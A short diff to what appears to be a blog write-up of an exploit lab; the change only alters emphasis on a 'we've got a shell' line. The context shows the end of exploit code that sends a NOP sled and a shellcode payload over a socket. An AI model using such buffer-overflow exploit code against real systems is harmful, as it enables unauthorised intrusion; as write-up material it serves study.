@@ -1013,7 +1013,7 @@ s.send("\x90" * (512-324) + shell)
 s.close()
 ```
 
-*In a muts like voice* "And we've got a shell. Nice.":
+****In a muts like voice**** "And we've got a shell. Nice.":
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/SHELLY.png" alt="">'
 
